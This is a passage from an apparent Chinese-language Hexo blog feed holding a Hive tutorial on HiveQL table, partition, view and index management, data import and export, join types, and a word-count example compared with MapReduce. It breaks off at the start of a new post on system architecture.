class="number">223456</span>,湖南省</span><br><span class="line">     location <span class="string">&#x27;/usr/local/hive/warehouse/hive.db/usr&#x27;</span>; </span><br><span class="line">     # LOCATION一般与外部表（<span class="keyword">EXTERNAL</span>）一起使用。一般情况下hive元数据默认保存在<span class="operator">&lt;</span>hive.metastore.warehouse.dir<span class="operator">&gt;</span>中。</span><br><span class="line">     # 这个字段的适用场景是：数据已经存在HDFS上不能移动位置了，那么就通过这个字段让表可以直接读到这份数据。另外，要注意建表的时候，应该让表变成外部表。</span><br><span class="line"></span><br><span class="line">#创建分区表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> usr3(</span><br><span class="line">      name string,</span><br><span class="line">      pwd string,</span><br><span class="line">      address struct<span class="operator">&lt;</span>street:string,city:string,state:string,zip:<span class="type">int</span><span class="operator">&gt;</span>,</span><br><span class="line">      identify map<span class="operator">&lt;</span><span class="type">int</span>,tinyint<span class="operator">&gt;</span>) </span><br><span class="line">      partitioned <span class="keyword">by</span>(city string,state string); # 双分区</span><br><span class="line">      </span><br><span class="line"> #复制usr表的表模式       </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> hive.usr1 <span class="keyword">like</span> hive.usr;</span><br><span class="line"><span class="keyword">show</span> tables <span class="keyword">in</span> hive;  </span><br><span class="line"><span class="keyword">show</span> tables <span class="string">&#x27;u.*&#x27;</span>;        #查看hive中以u开头的表</span><br><span class="line"><span class="keyword">describe</span> hive.usr;        #查看usr表相关信息</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> hive.usr rename <span class="keyword">to</span> custom;      #重命名表</span><br><span class="line">#为表增加一个分区</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> usr3 <span class="keyword">add</span> if <span class="keyword">not</span> <span class="keyword">exists</span> <span class="keyword">partition</span>(city<span class="operator">=</span>&quot;beijing&quot;,state<span class="operator">=</span>&quot;China&quot;) location <span class="string">&#x27;/usr/local/hive/warehouse/usr3/China/beijing&#x27;</span>; </span><br><span class="line"></span><br><span class="line">#修改分区路径</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> usr3 <span class="keyword">partition</span>(city<span class="operator">=</span>&quot;beijing&quot;,state<span class="operator">=</span>&quot;China&quot;) <span class="keyword">set</span> location <span class="string">&#x27;/usr/local/hive/warehouse/usr3/CH/beijing&#x27;</span>;</span><br><span class="line">#删除分区</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> usr3 <span class="keyword">drop</span> if <span class="keyword">exists</span>  <span class="keyword">partition</span>(city<span class="operator">=</span>&quot;beijing&quot;,state<span class="operator">=</span>&quot;China&quot;);</span><br><span class="line">#修改列信息,注意这里，如果使用 after时，交换元素类型不一致，就无法交换成功</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> custom change <span class="keyword">column</span> username username string after pwd;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> custom <span class="keyword">add</span> columns(hobby string);                  #增加列</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> custom replace columns(uname string);              #删除替换列</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> custom <span class="keyword">set</span> tblproperties(<span class="string">&#x27;creator&#x27;</span><span class="operator">=</span><span class="string">&#x27;liming&#x27;</span>);      #修改表属性</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> usr3 <span class="keyword">partition</span>(city<span class="operator">=</span>&quot;beijing&quot;,state<span class="operator">=</span>&quot;China&quot;) <span class="keyword">set</span> fileformat sequencefile;     #修改存储属性            </span><br><span class="line">use hive;                                                   #切换到hive数据库下</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> usr1;                                  #删除表</span><br><span class="line"><span class="keyword">drop</span> database if <span class="keyword">exists</span> hive cascade;                       #删除数据库和它中的表</span><br></pre></td></tr></table></figure>

<h6 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h6><ul>
<li><p><a href="https://www.cnblogs.com/sx66/p/12039163.html">Hive的数据模型及各模块的应用场景</a> 结合这个<a href="https://www.cnblogs.com/syx-1987/p/4182967.html">Hive之数据模型</a>来看效果比较好</p>
</li>
<li><p><a href="https://blog.csdn.net/heiren_a/article/details/109119081">Hive在建表时的分隔符的设置</a></p>
</li>
<li><p><a href="https://blog.csdn.net/weixin_44736028/article/details/106250453">hive 中的location</a></p>
</li>
</ul>
<h4 id="视图和索引的创建、修改和删除"><a href="#视图和索引的创建、修改和删除" class="headerlink" title="视图和索引的创建、修改和删除"></a>视图和索引的创建、修改和删除</h4><ul>
<li>主要语法如下，用户可自行实现。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create view view_name as....;                <span class="comment">#创建视图</span></span><br><span class="line">alter view view_name <span class="built_in">set</span> tblproperties(…);   <span class="comment">#修改视图</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>因为视图是只读的，所以 对于视图只允许改变元数据中的 tblproperties属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#删除视图</span><br><span class="line">drop view if exists view_name;</span><br><span class="line">#创建索引</span><br><span class="line">create index index_name on table table_name(partition_name/column_name)  </span><br><span class="line">as &#x27;org.apache.hadoop.hive.ql.index.compact.CompactIndexHandler&#x27; with deferred rebuild....; </span><br></pre></td></tr></table></figure>
</li>
<li><p>这里’org.apache.hadoop.hive.ql.index.compact.CompactIndexHandler’是一个索引处理器，即一个实现了索引接口的Java类，另外Hive还有其他的索引实现。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter index index_name on table table_name partition(...)  rebulid;   #重建索引</span><br></pre></td></tr></table></figure>

<ul>
<li>如果使用 deferred rebuild，那么新索引成空白状态，任何时候可以进行第一次索引创建或重建。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show formatted index on table_name;                       #显示索引</span><br><span class="line">drop index if exists index_name on table table_name;      #删除索引</span><br></pre></td></tr></table></figure>

<h6 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h6><ul>
<li>这里没有实践，示例可以参考这里<a href="https://www.cnblogs.com/tsxylhs/p/7341474.html">hadoop Hive 的建表 和导入导出及索引视图</a></li>
</ul>
<h4 id="用户自定义函数"><a href="#用户自定义函数" class="headerlink" title="用户自定义函数"></a>用户自定义函数</h4><ul>
<li><p>没有实践自定义函数，后续有需求在学</p>
</li>
<li><p>在新建用户自定义函数（UDF）方法前，先了解一下Hive自带的那些函数。<code>show functions;</code> 命令会显示Hive中所有的函数名称：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hive&gt; show functions;</span><br><span class="line">OK</span><br><span class="line">!</span><br><span class="line">!=</span><br><span class="line">$sum0</span><br><span class="line">....</span><br><span class="line">cardinality_violation</span><br><span class="line">case</span><br><span class="line">cbrt</span><br><span class="line">ceil</span><br><span class="line">ceiling</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>若想要查看具体函数使用方法可使用describe function 函数名：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hive&gt; describe function abs;</span><br><span class="line">OK</span><br><span class="line">abs(x) - returns the absolute value of x</span><br></pre></td></tr></table></figure>

<ul>
<li><p>首先编写自己的UDF前需要继承UDF类并实现evaluate()函数，或是继承GenericUDF类实现initialize()函数、evaluate()函数和getDisplayString()函数，还有其他的实现方法，感兴趣的用户可以自行学习。</p>
</li>
<li><p>另外，如果用户想在Hive中使用该UDF需要将我们编写的Java代码进行编译，然后将编译后的UDF二进制类文件(.class文件)打包成一个JAR文件，然后在Hive会话中将这个JAR文件加入到类路径下，在通过create function语句定义好使用这个Java类的函数。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add jar &lt;jar文件的绝对路径&gt;;                        #创建函数</span><br><span class="line">create temporary function function_name;</span><br><span class="line">drop temporary function if exists function_name;    #删除函数</span><br></pre></td></tr></table></figure>

<h3 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h3><ul>
<li>主要实现的是将数据装载到表中（或是从表中导出），并进行相应查询操作，对熟悉SQL语言的用户应该不会陌生。</li>
</ul>
<h4 id="向表中装载数据"><a href="#向表中装载数据" class="headerlink" title="向表中装载数据"></a>向表中装载数据</h4><p>这里我们以只有两个属性的简单表为例来介绍。首先创建表stu和course，stu有两个属性id与name，course有两个属性cid与sid。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table if not exists hive.stu(id int,name string) </span><br><span class="line">row format delimited fields terminated by &#x27;\t&#x27;;</span><br><span class="line">create table if not exists hive.course(cid int,sid int) </span><br><span class="line">row format delimited fields terminated by &#x27;\t&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>向表中装载数据有两种方法：<strong>从文件中导入和通过查询语句插入</strong>。</li>
</ul>
<h5 id="从文件中导入"><a href="#从文件中导入" class="headerlink" title="从文件中导入"></a>从文件中导入</h5><ul>
<li>假如这个表中的记录存储于文件stu.txt中，该文件的存储路径为&#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;examples&#x2F;stu.txt，内容如下。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># id后面的name分割符号要用键盘上的tab隔开，直接复制过去，导入进去会全部都是null</span><br><span class="line">1	xiapi </span><br><span class="line">2	xiaoxue </span><br><span class="line">3	qingqing</span><br></pre></td></tr></table></figure>

<ul>
<li><p>下面我们把这个文件中的数据装载到表stu中，操作如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span> use hive;</span><br><span class="line">hive<span class="operator">&gt;</span> load data <span class="keyword">local</span> inpath <span class="string">&#x27;/usr/local/hadoop/examples/stu.txt&#x27;</span> overwrite <span class="keyword">into</span> <span class="keyword">table</span> stu;</span><br><span class="line">Loading data <span class="keyword">to</span> <span class="keyword">table</span> hive.stu</span><br><span class="line">OK</span><br><span class="line"># 查询到数据</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> hive.stu;</span><br><span class="line">OK</span><br><span class="line"><span class="number">1</span>       xiapi</span><br><span class="line"><span class="number">2</span>       xiaoxue</span><br><span class="line"><span class="number">3</span>       qingqing</span><br><span class="line"><span class="type">Time</span> taken: <span class="number">1.324</span> s</span><br></pre></td></tr></table></figure>

<ul>
<li>如果stu.txt文件存储在HDFS 上，则不需要 local 关键字。</li>
</ul>
</li>
</ul>
<h5 id="通过查询语句插入"><a href="#通过查询语句插入" class="headerlink" title="通过查询语句插入"></a>通过查询语句插入</h5><p>使用如下命令，创建stu1表，它和stu表属性相同，我们要把从stu表中查询得到的数据插入到stu1中：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> stu1 <span class="keyword">as</span> <span class="keyword">select</span> id,name <span class="keyword">from</span> stu;</span><br><span class="line">...</span><br><span class="line">Moving data <span class="keyword">to</span> directory hdfs:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">9000</span><span class="operator">/</span><span class="keyword">user</span><span class="operator">/</span>hive<span class="operator">/</span>warehouse<span class="operator">/</span>hive.db<span class="operator">/</span>.hive<span class="operator">-</span>staging_hive_2021<span class="number">-12</span><span class="number">-10</span>_10<span class="number">-42</span><span class="number">-32</span>_320_1543053100774530944<span class="number">-1</span><span class="operator">/</span><span class="operator">-</span>ext<span class="number">-10002</span></span><br><span class="line">Moving data <span class="keyword">to</span> directory hdfs:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">9000</span><span class="operator">/</span><span class="keyword">user</span><span class="operator">/</span>hive<span class="operator">/</span>warehouse<span class="operator">/</span>hive.db<span class="operator">/</span>stu1</span><br><span class="line">MapReduce Jobs Launched:</span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-1</span>:  HDFS Read: <span class="number">31</span> HDFS Write: <span class="number">114</span> SUCCESS</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line"># 查询到stu1表结构如下</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">describe</span> stu1;</span><br><span class="line">OK</span><br><span class="line">id                      <span class="type">int</span></span><br><span class="line">name                    string</span><br><span class="line"><span class="type">Time</span> taken: <span class="number">0.268</span> seconds, Fetched: <span class="number">2</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure>

<p>上面是创建表，并直接向新表插入数据；若表已经存在，向表中插入数据需执行以下命令：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 这里关键字overwrite的作用是替换掉表（或分区）中原有数据，换成<span class="keyword">into</span>关键字，直接追加到原有内容后。</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">insert</span> overwrite <span class="keyword">table</span> stu1 <span class="keyword">select</span> id,name <span class="keyword">from</span> stu <span class="keyword">where</span>（id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># 查询发现只有id为<span class="number">1</span>的数据，其他数据全部清空</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> hive.stu1;</span><br><span class="line">OK</span><br><span class="line"><span class="number">1</span>       xiapi</span><br></pre></td></tr></table></figure>

<h4 id="从表中导出数据"><a href="#从表中导出数据" class="headerlink" title="从表中导出数据"></a>从表中导出数据</h4><h5 id="导出到本地文件"><a href="#导出到本地文件" class="headerlink" title="导出到本地文件"></a>导出到本地文件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">hive&gt; </span><span class="language-bash">insert overwrite <span class="built_in">local</span> directory <span class="string">&#x27;/usr/local/hadoop/examples/export_stu&#x27;</span> select * from hive.stu;</span></span><br><span class="line">...</span><br><span class="line">Moving data to local directory /usr/local/hadoop/examples/export_stu</span><br><span class="line">MapReduce Jobs Launched:</span><br><span class="line">Stage-Stage-1:  HDFS Read: 30 HDFS Write: 0 SUCCESS</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看导出的文件</span></span><br><span class="line">[hadoop@VM-24-13-centos local]$ cat /usr/local/hadoop/examples/export_stu/000000_0</span><br><span class="line">1xiapi</span><br><span class="line">2xiaoxue</span><br><span class="line">3qingqing</span><br></pre></td></tr></table></figure>

<h5 id="导出到hdfs"><a href="#导出到hdfs" class="headerlink" title="导出到hdfs"></a>导出到hdfs</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hive&gt; insert overwrite directory &#x27;/usr/local/hadoop/examples/export_hdfs_stu&#x27; select * from hive.stu;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Moving data to directory /usr/local/hadoop/examples/export_hdfs_stu</span><br><span class="line">MapReduce Jobs Launched:</span><br><span class="line">Stage-Stage-1:  HDFS Read: 30 HDFS Write: 30 SUCCESS</span><br><span class="line">Total MapReduce CPU Time Spent: 0 msec</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"># 查看导出成功的数据</span><br><span class="line">hive&gt; dfs -cat /usr/local/hadoop/examples/export_hdfs_stu/*;</span><br><span class="line">1xiapi</span><br><span class="line">2xiaoxue</span><br><span class="line">3qingqing</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="查询操作"><a href="#查询操作" class="headerlink" title="查询操作"></a>查询操作</h4><ul>
<li><p>和SQL的查询完全一样，这里不再赘述。主要使用select…from…where…等语句，再结合关键字group by、having、like、rlike等操作。这里我们简单介绍一下SQL中没有的case…when…then…句式、join操作和子查询操作。</p>
</li>
<li><p><code>case…when…then…</code>句式和if条件语句类似，用于处理单个列的查询结果，语句如下：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> id,name,</span><br><span class="line">    <span class="operator">&gt;</span>   <span class="keyword">case</span></span><br><span class="line">    <span class="operator">&gt;</span>   <span class="keyword">when</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">then</span> <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    <span class="operator">&gt;</span>   <span class="keyword">when</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">then</span> <span class="string">&#x27;second&#x27;</span></span><br><span class="line">    <span class="operator">&gt;</span>   <span class="keyword">else</span> <span class="string">&#x27;third&#x27;</span></span><br><span class="line">    <span class="operator">&gt;</span>   <span class="keyword">end</span> <span class="keyword">from</span> stu;</span><br><span class="line">OK</span><br><span class="line"><span class="number">1</span>       xiapi   <span class="keyword">first</span></span><br><span class="line"><span class="number">2</span>       xiaoxue         <span class="keyword">second</span></span><br><span class="line"><span class="number">3</span>       qingqing        third</span><br><span class="line"><span class="type">Time</span> taken: <span class="number">0.385</span> seconds, Fetched: <span class="number">3</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure>

<ul>
<li>连接（join）是将两个表中在共同数据项上相互匹配的那些行合并起来, HiveQL 的连接分为内连接、左向外连接、右向外连接、全外连接和半连接 5 种。</li>
</ul>
<h5 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h5><ul>
<li>内连接使用比较运算符根据每个表共有的列的值匹配两个表中的行。</li>
<li>首先，我们先把以下内容插入到course表中</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> course <span class="keyword">values</span>(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> course <span class="keyword">values</span>(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> course <span class="keyword">values</span>(<span class="number">3</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>下面, 查询stu和course表中学号相同的所有行，命令如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> stu.<span class="operator">*</span>, course.<span class="operator">*</span> <span class="keyword">from</span> stu <span class="keyword">join</span> course <span class="keyword">on</span>(stu.id<span class="operator">=</span>course.sid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line"><span class="number">1</span>       xiapi   <span class="number">2</span>       <span class="number">1</span></span><br><span class="line"><span class="number">1</span>       xiapi   <span class="number">3</span>       <span class="number">1</span></span><br><span class="line"><span class="number">2</span>       xiaoxue         <span class="number">1</span>       <span class="number">2</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">11.049</span> seconds, Fetched: <span class="number">3</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h5><p>右连接是左向外连接的反向连接,将返回右表的所有行。如果右表的某行在左表中没有匹配行,则将为左表返回空值。命令</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> stu.<span class="operator">*</span>, course.<span class="operator">*</span> <span class="keyword">from</span> stu <span class="keyword">right</span> <span class="keyword">outer</span> <span class="keyword">join</span> course <span class="keyword">on</span>(stu.id<span class="operator">=</span>course.sid);</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line"><span class="number">2</span>       xiaoxue         <span class="number">1</span>       <span class="number">2</span></span><br><span class="line"><span class="number">1</span>       xiapi   <span class="number">2</span>       <span class="number">1</span></span><br><span class="line"><span class="number">1</span>       xiapi   <span class="number">3</span>       <span class="number">1</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">10.887</span> seconds, Fetched: <span class="number">3</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure>

<h5 id="全连接"><a href="#全连接" class="headerlink" title="全连接"></a>全连接</h5><p>全连接返回左表和右表中的所有行。当某行在另一表中没有匹配行时,则另一个表的选择列表包含空值。如果表之间有匹配行,则整个结果集包含基表的数据值。命令如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> stu.<span class="operator">*</span>, course.<span class="operator">*</span> <span class="keyword">from</span> stu <span class="keyword">full</span> <span class="keyword">outer</span> <span class="keyword">join</span> course <span class="keyword">on</span>(stu .id<span class="operator">=</span>course .sid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line"><span class="number">1</span>       xiapi   <span class="number">3</span>       <span class="number">1</span></span><br><span class="line"><span class="number">1</span>       xiapi   <span class="number">2</span>       <span class="number">1</span></span><br><span class="line"><span class="number">2</span>       xiaoxue         <span class="number">1</span>       <span class="number">2</span></span><br><span class="line"><span class="number">3</span>       qingqing        <span class="keyword">NULL</span>    <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>

<h5 id="半连接"><a href="#半连接" class="headerlink" title="半连接"></a>半连接</h5><p>半连接是 Hive 所特有的, <strong>Hive 不支持 in 操作,但是拥有替代的方案</strong>;<code> left semi join,</code> 称为半连接, 需要注意的是连接的表不能在查询的列中,只能出现在 on 子句中。命令如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> stu.<span class="operator">*</span> <span class="keyword">from</span> stu <span class="keyword">left</span> semi <span class="keyword">join</span> course <span class="keyword">on</span>(stu .id<span class="operator">=</span>course .sid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line"><span class="number">1</span>       xiapi</span><br><span class="line"><span class="number">2</span>       xiaoxue</span><br><span class="line"><span class="type">Time</span> taken: <span class="number">9.267</span> seconds, Fetched: <span class="number">2</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure>

<h5 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h5><p>标准 SQL 的子查询支持嵌套的 select 子句,HiveQL 对子查询的支持很有限,只能在from 引导的子句中出现子查询。</p>
<h3 id="Hive简单编程实践"><a href="#Hive简单编程实践" class="headerlink" title="Hive简单编程实践"></a>Hive简单编程实践</h3><ul>
<li><p>下面我们以词频统计算法为例，来介绍怎么在具体应用中使用Hive。词频统计算法又是最能体现MapReduce思想的算法之一，这里我们可以对比它在MapReduce中的实现，来说明使用Hive后的优势。</p>
</li>
<li><p>MapReduce实现词频统计的代码可以通过下载Hadoop源码后，在 $HADOOP_HOME&#x2F;share&#x2F;hadoop&#x2F;mapreduce&#x2F;hadoop-mapreduce-examples-3.0.3.jar 包中找到(wordcount类)，wordcount类由63行Java代码编写而成。下面首先简单介绍一下怎么使用MapReduce中wordcount类来统计单词出现的次数，具体步骤如下：</p>
<ul>
<li>创建input目录，output目录会自动生成。其中input为输入目录，output目录为输出目录。命令如下：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/hadoop</span><br><span class="line">rm -r input</span><br><span class="line">mkdir input</span><br></pre></td></tr></table></figure>

<ul>
<li>然后，在input文件夹中创建两个测试文件file1.txt和file2.txt，命令如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd  /usr/local/hadoop/input</span><br><span class="line">[hadoop@VM-24-13-centos input]$ echo &quot;hello world&quot; &gt; file1.txt</span><br><span class="line">[hadoop@VM-24-13-centos input]$ echo &quot;hello world&quot; &gt; file1.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>执行如下hadoop命令：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos hadoop]$ cd  ..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先删除hdfs中output目录，不然会报错</span></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ hadoop dfs -rm -r output</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 删除input</span></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ hdfs dfs -rm -r input</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在HDFS创建一个目录</span></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ hdfs dfs -mkdir input</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制input到hdfs中的input目录</span></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ hdfs dfs -put input/*  input</span><br><span class="line"></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.0.3.jar wordcount input output</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">2021-12-10 15:22:03,703 INFO mapreduce.Job:  map 100% reduce 100%</span><br><span class="line">2021-12-10 15:22:03,704 INFO mapreduce.Job: Job job_local1659054277_0001 completed successfully</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>我们可以到output文件夹中查看结果，结果如下：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos hadoop]$ hdfs dfs -ls output/*</span><br><span class="line">-rw-r--r--   1 hadoop supergroup          0 2021-12-10 17:12 output/_SUCCESS</span><br><span class="line">-rw-r--r--   1 hadoop supergroup         25 2021-12-10 17:12 output/part-r-00000</span><br><span class="line"></span><br><span class="line">[hadoop@VM-24-13-centos hadoop]$ hdfs dfs -cat  output/part-r-00000</span><br><span class="line">hadoop  1</span><br><span class="line">hello   2</span><br><span class="line">world   1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>下面我们通过HiveQL实现词频统计功能，此时只要编写下面7行代码，而且不需要进行编译生成jar来执行。HiveQL实现命令如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[hadoop<span class="variable">@VM</span><span class="number">-24</span><span class="number">-13</span><span class="operator">-</span>centos hadoop]$ hive</span><br><span class="line"></span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> docs(line string);</span><br><span class="line">hive<span class="operator">&gt;</span> load data inpath <span class="string">&#x27;input&#x27;</span> overwrite <span class="keyword">into</span> <span class="keyword">table</span> docs;</span><br><span class="line"># <span class="keyword">create</span> <span class="keyword">table</span> word_count 表示创建数据库</span><br><span class="line"># <span class="keyword">as</span> <span class="keyword">select</span> word, <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">as</span> count 表示查询列表，一个word，一个统计值</span><br><span class="line">#  <span class="keyword">from</span> (<span class="keyword">select</span> explode(split(line,<span class="string">&#x27; &#x27;</span>))<span class="keyword">as</span> word <span class="keyword">from</span> docs) 这里就是从docs复制数据</span><br><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> word_count <span class="keyword">as</span> <span class="keyword">select</span> word, <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">as</span> count <span class="keyword">from</span> (<span class="keyword">select</span> explode(split(line,<span class="string">&#x27; &#x27;</span>))<span class="keyword">as</span> word <span class="keyword">from</span> docs) w <span class="keyword">group</span> <span class="keyword">by</span> word <span class="keyword">order</span> <span class="keyword">by</span> word;</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行后，用select语句查看，结果如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hive<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> word_count;</span><br><span class="line">OK</span><br><span class="line">hadoop  <span class="number">1</span></span><br><span class="line">hello   <span class="number">2</span></span><br><span class="line">world   <span class="number">1</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">0.148</span> seconds, Fetched: <span class="number">3</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>由上可知，采用Hive实现最大的优势是，对于非程序员，不用学习编写Java MapReduce代码了，只需要用户学习使用HiveQL就可以了，而这对于有SQL基础的用户而言是非常容易的。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>Hadoop</tag>
        <tag>Hive</tag>
      </tags>
  </entry>
  <entry>
    <title>系统架构介绍</title>
    <url>/aposts/632627bf/</url>
    <content><![CDATA[<h2 id="单机架构"><a href="#单机架构" class="headerlink" title="单机架构"></a>单机架构</h2><p>单机架构是最原始的传统架构，如下图所示，Model V1中Web服务器和App的服务器直接放在一起，随着业务持续增长，Model V2中把Web和App服务器分开管理，随着进一步业务增长需求，DB也很出现性能瓶颈，Web和App服务器频繁读取文件也会造成IO瓶颈，为了不影响现在业务，于是集群方案就产生</p>
<p><img src="/aposts/632627bf/image-20211018151234673-1634541156515-1634541167738.png" alt="image-20211018151234673"></p>
<h2 id="集群结构"><a href="#集群结构" class="headerlink" title="集群结构"></a>集群结构</h2><ul>
<li>如图  所示 Model V3 结构 Web&amp;App 服务都可以用多台机器来进行负载分担，DB的瓶颈也可以采用分区、分库、分表的方式来缓解;分库、分区、分表宗旨是减小遍历范围，提高响应速度。</li>
